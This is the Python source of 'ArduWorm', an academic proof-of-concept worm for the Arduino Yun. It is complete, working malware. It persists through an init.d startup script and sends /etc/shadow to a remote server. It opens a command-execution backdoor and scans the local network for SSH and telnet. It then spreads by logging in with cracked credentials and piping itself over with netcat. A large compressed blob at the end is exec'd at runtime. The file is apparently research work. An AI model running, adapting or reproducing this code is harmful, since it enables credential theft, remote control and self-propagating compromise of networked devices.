#!/usr/bin/python
# -*- coding: utf-8 -*-

############################################
#         Jorge Rodríguez Canseco          #
#         Sergio Pastrana Portillo         #
#                                          #
#    Universidad Carlos III de Madrid      #
#                                          #
############################################
# ArduWorm. Practical worm PoC
#
# This PoC implements a practical worm for the Arduino Yun
# This worm will first try to gain persistence in the system it is running
# and to get awareness of its environment. After this, the worm
# will execute its payload, which will be to provide a simple backdoor
# by opening port [port_to_choose] and waiting for connections.
# In addition, the worm exfiltrates the shadow file to a external server
# for cracking and uses this password to expand over the network.

import socket,subprocess,os, telnetlib, multiprocessing
from time import sleep

#   MAIN ENVIRONMENTAL VARIABLES
AM_I_ROOT = False
WHOAMI = ""
WHEREAMI = ""
ABSPATH = ""
SCRIPTNAME = ""
USBDEVICES = []
SERIALDEVICES = []
COPYFILEPATH = "/usr/lib/arduworm/arduworm"
KEYDESTPATH = "/usr/lib/arduworm/aky"
NETWORKINFO = {}
LOCALHOSTS = []
HOST_PORT_LIST = {}

def main():

    #############################################
    #    PHASE 0: LOCAL ENVIRONMENTAL RECON     #
    #############################################

    # Get USB devices and serial ports
    p=subprocess.Popen (["lsusb"],shell=True, stdout=subprocess.PIPE);
    for device in p.stdout:
        USBDEVICES.append(device)

    # Get serial devices We will use serial devices as an infection vector attempt
    p=subprocess.Popen (["ls", "/dev/tty.*"], shell=True, stdout=subprocess.PIPE);
    for serial in p.stdout:
        SERIALDEVICES.append(device)

    global ABSPATH
    ABSPATH = os.path.abspath(__file__)
    WHEREAMI, SCRIPTNAME = ABSPATH.rsplit('/',1)

    newpid = os.fork()
    if newpid == 0:
        #child
        print "Persisting..."
        gainPersistence()
        print "Scanning..."
        reconaissance()

        for segment in HOST_PORT_LIST:
            myIP = segment
            otherhosts = HOST_PORT_LIST[segment]
            for remotehost in otherhosts:
                if 22 in otherhosts[remotehost]:
                        print "Attack to " + remotehost
                        exploitation_ssh(remotehost, myIP)
                if 23 in otherhosts[remotehost]:
                        exploitation_telnet(remotehost, myIP)

                #exploitation(remotehost, myIP)

        # End of sequence. Exiting

    else:
        while True:
            try:
                executePayload()
                sleep(1)
            except:
                # Waiting to get persistence child to end in case of errors and retry
                sleep(5)


#############################################
#    PHASE 1: PERSISTENCE IN THE SYSTEM     #
#############################################
def gainPersistence():
    # To be done by child process
    # Checking if already persisted (startup file exists)

    # Checking if backup of this script exists
    _srccopied = os.path.isfile(COPYFILEPATH)
    if not _srccopied:
        try:
            try:
                os.makedirs(COPYFILEPATH.rsplit('/',1)[0])
            except:
                pass
            md=open(ABSPATH, 'r+')
            df=open(COPYFILEPATH, 'w+')
            for line in md:
                df.write(line)
            md.close()
            df.close()
        except:
            pass #cannot persist

    _persisted = os.path.isfile("/etc/init.d/arduworm")
    if not _persisted:

        startup_stub = "#!/bin/sh /etc/rc.common\nSTART=55\nstart(){\n  python "+ COPYFILEPATH + " &\n}\n"
        fd = open("/etc/init.d/arduworm", 'w+')
        fd.write(startup_stub)
        fd.close()
        # Scheduling worm to launch at startup (pipes used to make it silent)
        import stat
        os.chmod("/etc/init.d/arduworm", stat.S_IXGRP)
        proc = subprocess.Popen(["/etc/init.d/arduworm", "enable"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    # DONE PERSISTENCE PHASE

#############################################
#    PHASE 2: WORM PAYLOAD EXECUTION        #
#############################################
def executePayload():
    # To be done by main process in a loop

    # Exfiltrate passwd file (PoC). Substitute values with appropriate ones
    REMOTEHOST = '[SERVER_ADDRESS]'
    REMOTEPORT = 1234

    # Check exclusive lock to see if the file is already exfiltrated or it is necessary to do so.
    if not os.path.exists(KEYDESTPATH):
        s = socket.socket()
        s.connect((REMOTEHOST, REMOTEPORT))

        # Upload Command
        s.sendall("1")

        with open('/etc/shadow') as f:
            shadowbytes = f.read()
            s.sendall(shadowbytes)
            s.close()

        # Create exclusive lock to avoid re-exfiltrate file
        with open(KEYDESTPATH, "w+") as f:
            f.write("")
    else:
        print "Password was already exfiltrated"
    # Backdoor opening
    while True:
        HOST = ''
        # Substitute by a different port from the exfiltration one
        PORT = 1235
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)
        conn, addr = s.accept()
        conn.sendall("[CONNECTION ESTABLISHED]\n")
        while True:
             data = conn.recv(1024)

             # Receiving cracked file from remote server
             if data == "recvshadw":
                 # Receive complete data set
                 with open(KEYDESTPATH, "w+") as f:
                     while True:
                         data2 = conn.recv(1024)
                         if not data:
                             break
                         f.write(data2)
                         f.flush()

                    # End of Shadow File routine
                     continue

             if data == "quit" or not data: break
             proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             stdout_value = proc.stdout.read() + proc.stderr.read()
             conn.sendall(stdout_value + "\n> ")
        conn.close()

#############################################
#    PHASE 3: RECONAISSANCE FOR SPREADING   #
#############################################
def reconaissance():
    # VECTOR 1. NETWORK CONNECTION THROUGH TELNET.
    # Getting interfaces
    interfaces = os.listdir('/sys/class/net/')
    for interface in interfaces:
        if interface == 'lo': continue
        f = os.popen('ifconfig %s' % (interface))
        for line in f:
            if "inet" in line.split():
                ipaddr = line.split()[line.split().index("inet")+1]
                if ':' in ipaddr:
                    ipaddr = ipaddr.split(':')[-1]
                NETWORKINFO[interface] = ipaddr

    for segment in NETWORKINFO:
        segment_host_list = reconNetwork(NETWORKINFO[segment])
        HOST_PORT_LIST[NETWORKINFO[segment]] = segment_host_list

def reconNetwork(hostAddress):
    # Getting current network information. By default only gets 255 addresses per interface

    pfx = hostAddress.rsplit('.', 1)[0]
    sfx = hostAddress.rsplit('.', 1)[-1]
    pool_size = 10
    nwinfo = {}
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()
    pool = [ multiprocessing.Process(target=scanHost, args=(jobs,results))
             for i in range(pool_size) ]
    for p in pool:
        p.start()
    for i in range(1,255):
        # Skipping own address
        if int(sfx) is not i:
            jobs.put( pfx + '.{0}'.format(i))
    for p in pool:
        jobs.put(None)
    for p in pool:
        p.join()
    while not results.empty():
        hostinf = results.get()
        nwinfo[hostinf[0]] = hostinf[1]

    return nwinfo

def scanHost(job_q, results_q):
    DEVNULL = open(os.devnull,'w')
    PORTS = [22, 23]
    while True:
        ip = job_q.get()
        if ip is None:
            #print "Exiting"
            break
        print "Scanning " + ip
        _openPorts = []
        for i in PORTS:
            try:
                result = socket.create_connection((ip, i), timeout=.5)
                _openPorts.append(i)
                s.close()
            except:
                pass

        if len(_openPorts) > 0:
            results_q.put((ip, _openPorts))

#############################################
#    PHASE 4: EXPLOITATION ATTEMPT          #
#############################################

def exploitation_ssh(target_host, local_host):
    # This exploit attempt will try to connect through telnet to spread the worm
    # Default credentials check
    user = ""
    password = ""
    cracked = False

    # Check if bruteforce of the password has already been obtained. If not, wait until received
    while not cracked:
        received = False
        try:
            received = (os.path.exists(KEYDESTPATH)) and (os.path.getsize(KEYDESTPATH) != 0)
        except:
            pass

        if received:
            with open(KEYDESTPATH, "r") as f:
                credentials = f.readline()
                user = credentials.split(":")[0]
                password = credentials.split(":")[1]
                print "Obtained " + user + " and " + password + " as credentials from cracked received file"
                cracked = True

        else:
            sleep(5)

    remoteInclusionPath = "/copiedworm"
    get_ptyLib_stub()
    ptymod = importCode(_PTYPROCLIBCODE_, 'ptymodule')
    p = ptymod.PtyProcessUnicode.spawn(['/usr/bin/ssh', '-y', user +'@' + target_host])

    # Creating listener socket
    HOST = ''
    # Substitute by a different port from the exfiltration one
    PORT = 1235
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)

    sleep(1)
    p.write(password + "\n")
    sleep(1)
    p.write(("nc %s " + str(PORT) +" > %s\n") % (local_host, remoteInclusionPath))
    sleep(1)
    conn, addr = s.accept()
    with open(ABSPATH) as f:
        conn.sendall(f.read())
        sleep(3)
        conn.close()
        sleep(1)
    p.write("python " + remoteInclusionPath + " &\n")
    sleep(10)
    p.write("python " + remoteInclusionPath + " &\n")


def exploitation_telnet(target_host, local_host):
    # This exploit attempt will try to connect through telnet to spread the worm

    user = ""
    password = ""
    cracked = False

    # Check if bruteforce of the password has already been obtained. If not, wait until received
    while not cracked:
        if (os.path.exists(KEYDESTPATH)) and (os.path.getsize(KEYDESTPATH) != 0):
            with open(KEYDESTPATH, "r") as f:
                credentials = f.readline()
                user = credentials.split(":")[0]
                password = credentials.split(":")[1]
                print "Obtained " + user + " and " + password + " as credentials from cracked received file"
                cracked = True

        else:
            print "Cracked pass not received. Sleeping..."
            sleep(5)

    tn = telnetlib.Telnet(target_host)
    remoteInclusionPath = "/copiedworm"

    # LOGIN
    tn.read_until("login: ")
    tn.write(user + "\n")
    tn.read_until("Password:")
    tn.write(password + "\n")
    res = tn.read_until("incorrect", 3)
    if "incorrect" in res:
        # Password was not correct. Exiting
        exit(1)

    # CONNECTED, starting copy. Substitute port
    subprocess.Popen("nc -l 1234 < " + ABSPATH, shell=True)
    sleep(1)
    tn.write("nc %s 1234 > %s\n" % (local_host, remoteInclusionPath))
    sleep(1)
    tn.write("python " + remoteInclusionPath + " &")
    # Waiting for worm to spread
    sleep(10)
    tn.write("exit\n")

def importCode(code,name,add_to_sys_modules=0):
    import sys,imp
    module = imp.new_module(name)
    exec code in module.__dict__
    if add_to_sys_modules:
        sys.modules[name] = module
    return module

#ptyprocess library stub
def get_ptyLib_stub():
    import base64, zlib
    global _PTYPROCLIBCODE_
    _PTYPROCLIB_ = "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